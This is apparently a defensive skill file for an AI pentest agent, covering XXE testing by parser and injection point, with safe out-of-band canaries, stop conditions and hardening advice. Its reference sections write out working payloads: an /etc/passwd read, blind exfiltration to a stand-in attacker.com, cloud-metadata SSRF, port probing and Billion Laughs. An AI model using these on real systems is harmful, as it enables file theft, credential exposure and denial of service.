---
name: payload-reference-xxe
description: XML External Entity reference framework — defensive taxonomy organized by injection point (SOAP, REST XML, SVG upload, XLSX/Office, PDF/XFA, SAML), parser configuration variants (libxml, Xerces, .NET XmlReader), safe canary strategy via controlled out-of-band DNS/HTTP callback, and entity expansion/directory listing awareness with strict no-file-read and no-SSRF boundaries.
disable-model-invocation: true
risk: passive
allowed-modes: [auto, bug-bounty, red-team, ctf, blue-team, offensive, grey-hat, forensic, reverse-engineering, mobile-pentest]
authorization-required: conditional
evidence-outputs: [reference-notes, validation-plan, safe-canary-log, redaction-decision]
---

# Payload Reference XXE

Use this skill as a defensive reference framework for XML External Entity assessment. Organize payload knowledge by injection point (SOAP web service, REST endpoint accepting XML, SVG image upload, Office/OpenDocument file upload, PDF form data, SAML assertion), parser configuration (libxml2, Xerces, .NET XmlReader, Java SAX/DOM/StAX, Python lxml/defusedxml), and entity expansion types. Every payload discussion maps to a safe canary strategy — confirming entity resolution via a controlled out-of-band callback without reading local files, probing internal networks, or causing denial of service. This skill is a reference and triage aid. It never provides file-read or SSRF runbooks. All active validation routes through `pentest_agent_execute_tool` with authorization, scope, and approval gates.

## Required inputs

- XML injection point: where user-supplied XML or XML-containing data is parsed (API endpoint accepting `Content-Type: application/xml` or `text/xml`, SOAP action, SVG upload, XLSX/DOCX/ODT file upload, SAML IdP response processing, PDF form import, RSS/Atom feed parser, or sitemap.xml upload).
- Parser hints: technology stack, XML library name from error messages, or DTD/entity behavior observed (entities expanded, entities ignored, error on DOCTYPE).
- XML structure: the expected XML schema, namespaces, and any input validation that strips DOCTYPE declarations or external entity syntax.
- Target and scope file when any live system is mentioned.
- Authorization cache before target contact.
- Desired output: validation plan, safe canary design, triage decision, or redaction guidance.

## Required gates

1. `pentest_agent_load_config` → `pentest_agent_validate_policy`.
2. `pentest_agent_parse_scope` when target context exists.
3. `pentest_agent_validate_target` before any live URL, host, API, or account is contacted.
4. `pentest_agent_check_authorization` before active validation, including outbound listener setup.
5. `pentest_agent_build_command` → `pentest_agent_execute_tool` for all active checks.
6. `pentest_agent_append_evidence` for redacted notes.

## Defensive payload taxonomy

### Category 1 — out-of-band safe canary (preferred: no file read, no SSRF)

Goal: confirm external entity resolution using a controlled DNS/HTTP callback — the safest XXE validation method.

**Safe OOB canary (DNS)**:
```xml
<!DOCTYPE test [
  <!ENTITY % safe SYSTEM "http://<unique>.collaborator.oastify.com/xxe-dns">
  %safe;
]>
```
If the parser resolves the external entity, your Collaborator receives a DNS lookup. This confirms: (1) the parser processes DTD declarations, (2) external entities are resolved, and (3) outbound network access from the parser is possible. No file is read, no internal host is contacted.

**Safe OOB canary (HTTP)**:
```xml
<!DOCTYPE test [
  <!ENTITY % safe SYSTEM "http://<unique>.collaborator.oastify.com/xxe-http">
  %safe;
]>
```
Same as DNS canary but verifies the full HTTP stack. Some parsers resolve DNS but do not complete HTTP requests — the HTTP canary confirms deeper network capability.

**Safe OOB canary (parameter entity)**:
```xml
<!DOCTYPE test [
  <!ENTITY % safe SYSTEM "http://<unique>.collaborator.oastify.com/xxe-param">
  %safe;
]>
```
Parameter entities (`%name;`) are parsed in the DTD, not the document body. If the DNS/HTTP callback arrives, parameter entity resolution is enabled — a stronger indicator of XXE risk than general entity resolution.

**In-band canary (entity substitution)**:
```xml
<!DOCTYPE test [
  <!ENTITY safe "XXE_CONFIRMED">
]>
<test>&safe;</test>
```
If the response contains `XXE_CONFIRMED`, internal entity substitution works. This does NOT confirm external entity resolution — it only confirms internal entity processing. Escalation to external entities may or may not be possible. Record as "internal entity processing confirmed; external entity resolution not yet tested."

### Category 2 — parser configuration variants (reference)

Goal: understand how different parsers handle XXE for defense assessment.

**libxml2 (PHP, Python lxml default)**:
- External entities: enabled by default before libxml2 2.9. PHP's `LIBXML_NOENT` flag is NOT set by default; `simplexml_load_string` and `DOMDocument::loadXML` are safe unless `LIBXML_NOENT` is explicitly passed. Python's `lxml` uses libxml2 and is vulnerable to XXE unless `resolve_entities=False` is set.
- Safe canary: `<!DOCTYPE test [<!ENTITY safe SYSTEM "http://collaborator/xxe">]><test>&safe;</test>` — the entity is referenced in the document, triggering resolution.
- `LIBXML_NOENT`: when set, entity substitution occurs (internal and external). When NOT set, entity nodes are created but external entities are NOT resolved. The PHP libraries are safe by default.
- `LIBXML_DTDLOAD`: enables DTD loading. Without this flag (PHP default), external DTDs are not loaded but inline DOCTYPE declarations are still processed.

**Java SAX/DOM/StAX (javax.xml.parsers)**:
- External entities: disabled by default since Java 7u67 and Java 8u20 (JAXP 1.5). However, many older applications explicitly enable them or run on older Java versions.
- Safe canary: `<!DOCTYPE test [<!ENTITY % safe SYSTEM "http://collaborator/xxe"> %safe;]>` — parameter entity DOCTYPE canary.
- `FEATURE_SECURE_PROCESSING`: when set, limits entity expansion and disables external entities.
- JAXB (XML binding): uses SAX/DOM underneath; vulnerable if the underlying parser has entities enabled.
- Apache Xerces: the default Java XML parser. Entity expansion limits (`ENTITY_EXPANSION_LIMIT`) prevent Billion Laughs but do not block external entities.

**Java DOM4j/JDOM/XOM**: alternative Java XML libraries. DOM4j enables external entities by default in many versions. JDOM disables them by default. XOM does not support DTDs at all.

**.NET XmlReader (System.Xml)**:
- `XmlReaderSettings.DtdProcessing`: `DtdProcessing.Prohibit` (default in .NET 4.5.2+) blocks all DTD processing. `DtdProcessing.Ignore` skips DTDs without error. `DtdProcessing.Parse` enables DTDs — this is the dangerous setting.
- `XmlResolver`: when set to `null` or `XmlSecureResolver`, external entity resolution is blocked even if DTD processing is enabled.
- `XmlDocument`: wrapper around `XmlReader`; vulnerable if `XmlResolver` is set and DTD processing is `Parse`.
- `XDocument` (LINQ to XML): does not support DTDs at all — safe by design.

**Python defusedxml**: the `defusedxml` library provides safe wrappers (`defusedxml.ElementTree`, `defusedxml.lxml`) that disable external entities and entity expansion (Billion Laughs). If defusedxml is used, XXE is mitigated regardless of the underlying parser.

**Node.js**: no built-in XML parser. Third-party libraries (`libxmljs`, `xml2js`, `fast-xml-parser`) have varying XXE postures. `libxmljs` (binding to libxml2) is potentially vulnerable. `xml2js` and `fast-xml-parser` are pure-JavaScript and do NOT process DTDs — safe from XXE.

### Category 3 — file-read vectors (reference for defense; do not execute)

Goal: understand file-read XXE for defense assessment and patch validation.

**Direct file read** (classic XXE):
```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>
```
The entity `&xxe;` is replaced with the contents of `/etc/passwd`. References the file as a URI. Blocked by: disabling external entities, disallowing `file://` protocol, or setting an `EntityResolver` that rejects file URIs.

**Parameter entity file read with OOB exfiltration** (blind XXE):
```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % exfil SYSTEM "http://attacker.com/?data=%file;">
  %exfil;
]>
```
The `file` parameter entity reads the file, and the `exfil` parameter entity sends it to the attacker's server in the query string. This requires: (1) external parameter entities enabled, (2) outbound HTTP from the parser, and (3) the file content to be valid within a URI query string (no newlines, no null bytes).

**Error-based file read**:
```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % fake SYSTEM "file:///nonexistent/%file;">
  %fake;
]>
```
The parser attempts to load a file whose path includes the contents of `/etc/passwd`. The error message reveals the path (and therefore the file contents). Requires error messages to be returned to the attacker.

**XInclude file read** (alternative to DOCTYPE):
```xml
<test xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</test>
```
XInclude (XML Inclusions) is a separate mechanism from DTD entities. It resolves external references via `xi:include` elements and does not require DOCTYPE declarations. If the parser supports XInclude, XXE-like file read is possible even when DOCTYPE processing is disabled.

Reference only for defense assessment. Do NOT execute file-read vectors in active validation. File read via XXE accesses sensitive server files — escalate only with explicit data-access authorization.

### Category 4 — SSRF via XXE (reference for defense; do not execute)

Goal: understand XXE-to-SSRF chaining for defense.

**Internal HTTP probe via XXE**:
```xml
<!DOCTYPE test [
  <!ENTITY probe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<test>&probe;</test>
```
The entity fetches the cloud metadata endpoint. The response content appears in the XML output. This is both file-read and SSRF. Requires: external entities enabled AND internal network access.

**Internal port scanning via XXE**:
```xml
<!DOCTYPE test [
  <!ENTITY scan SYSTEM "http://localhost:22/">
]>
<test>&scan;</test>
```
The entity attempts HTTP connection to localhost port 22 (SSH, no HTTP). The error message or timeout reveals whether the port is open (connection refused quickly) vs filtered (timeout). Reference for defense: disable external entities to block this vector entirely.

Reference only. Do NOT probe internal services or cloud metadata endpoints via XXE without explicit internal-network authorization.

### Category 5 — entity expansion and denial of service (reference)

Goal: understand Billion Laughs and Quadratic Blowup for defense.

**Billion Laughs attack** (exponential entity expansion):
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  ... (recursive to lol9 = 10^9 "lol" strings = 3 GB)
]>
<test>&lol9;</test>
```
Exponential expansion of entity references. At `lol9`, the expanded text is 10^9 repetitions (3 GB). This exhausts parser memory and causes denial of service. Mitigation: entity expansion limits (libxml2 `XML_MAX_TEXT_LENGTH`, Java `ENTITY_EXPANSION_LIMIT`, .NET `MaxCharactersFromEntities`).

**Quadratic Blowup**: a single large entity referenced multiple times. A 100 KB entity referenced 100,000 times produces 10 GB of output with linear (not exponential) memory growth. Harder to mitigate than Billion Laughs.

Do NOT execute DoS vectors in active validation. Reference for defense assessment and parser configuration review.

### Category 6 — XXE via file upload (reference)

Goal: understand non-obvious XXE vectors for defense.

**SVG file upload**: SVG is XML. An uploaded SVG with embedded DOCTYPE and external entity can trigger XXE when the server processes the SVG (thumbnail generation, metadata extraction, or conversion). The SVG can also contain `<foreignObject>` with JavaScript — SVG is both an XXE and XSS vector.

**Office/OpenDocument files**: DOCX, XLSX, PPTX (Office Open XML), and ODT, ODS (OpenDocument) are ZIP archives containing XML files. If the server extracts and parses the XML, an attacker can inject a DOCTYPE into an XML file within the archive. The most injected file is `docProps/core.xml` or `word/document.xml`.

**PDF form data (XFA)**: Adobe XML Forms Architecture (XFA) embeds XML within PDF. If a PDF parser processes XFA data, XXE can be triggered through a crafted PDF upload.

**SAML assertion**: SAML is XML. A malicious Identity Provider (or a compromised one) can send a SAML assertion containing an XXE payload. If the Service Provider's SAML parser has external entities enabled, XXE is triggered during SAML processing. This is a critical finding because SAML often runs with elevated privileges.

**SOAP**: SOAP envelopes are XML. Every SOAP endpoint is a potential XXE target unless the SOAP library explicitly disables DTD processing.

## Decision points

- **OOB canary callback received → confirm external entity resolution**: record the Collaborator interaction. Do NOT escalate to file read — the OOB canary alone confirms the vulnerability is present and the parser configuration is insecure.
- **Internal entity substitution works but OOB canary fails → confirm internal entities only**: external entities may be disabled. Document as "internal entity processing; external entities mitigated." Lower severity finding.
- **No entity substitution at all → document as XXE-safe**: the parser likely has entity resolution disabled entirely. Record the parser fingerprint and version for verification.
- **OOB canary fails but file-read attempt returned passwd content → STOP**: this means you already accessed a sensitive file. Redact the file content, document the critical finding, and recommend `defusedxml` or parser hardening immediately. Do not read additional files.
- **Parser error reveals internal file paths → redact from evidence**: document the information disclosure separately from XXE.

## Prohibited behavior

- Reading local files via `file://` protocol — even `/etc/hostname` as a "safe" canary. The OOB canary is the safe alternative. File read via XXE accesses server files and may expose secrets.
- Probing internal hosts or cloud metadata endpoints via XXE.
- Causing denial of service via Billion Laughs or Quadratic Blowup.
- Uploading crafted DOCX/XLSX/SVG/SAML files without explicit authorization for file-upload testing.
- Using parameter entity exfiltration to send file contents to an external server.
- Chaining XXE with SSRF to enumerate internal services.
- Providing step-by-step exploitation recipes beyond safe product behavior and defensive reference.
- Accessing files that may contain credentials, config, or database connection strings.

## Stop conditions

- OOB canary confirms external entity resolution → stop, document critical finding, recommend disabling external entities immediately.
- File read returns ANY content (even expected safe files) → stop, redact content, document critical finding.
- Cloud metadata endpoint returns data → stop, critical finding involving both XXE and cloud credential exposure.
- Parser error exposes internal file paths or server configuration → stop, redact from evidence.
- XXE triggered via file upload and the server processed a crafted file → stop, do not upload additional crafted files; document the vulnerable endpoint.

## Evidence

Record: affected XML endpoint and content type, parser library and version (if inferred from errors or headers), OOB canary interaction (DNS only, HTTP, or none), entity resolution behavior (internal only, external confirmed), DTD/DOCTYPE processing status, and any parser configuration hints observed.

Never store: file contents from `file://` reads, cloud metadata response content, internal service responses, Collaborator interaction bodies containing file data, or parser error messages with internal paths.

## Report handoff

1. When an XXE surface is confirmed, hand off to `vuln-xxe` for active validation with `pentest_agent_execute_tool`.
2. Reference this payload taxonomy in the finding as the detection rationale — link the canary type used (OOB DNS vs HTTP), the parser behavior observed, and the entity resolution scope confirmed.
3. If parser-specific configuration (libxml2 `LIBXML_NOENT`, .NET `XmlReaderSettings.DtdProcessing`, Java `DocumentBuilderFactory` features) was identified, include it in the handoff notes to guide the active validator.
4. Recommend: disable DTD/DOCTYPE processing entirely (`setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` in Java, `libxml_disable_entity_loader(true)` in PHP, `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` in .NET), use `defusedxml` in Python, and validate XML against a schema before parsing.
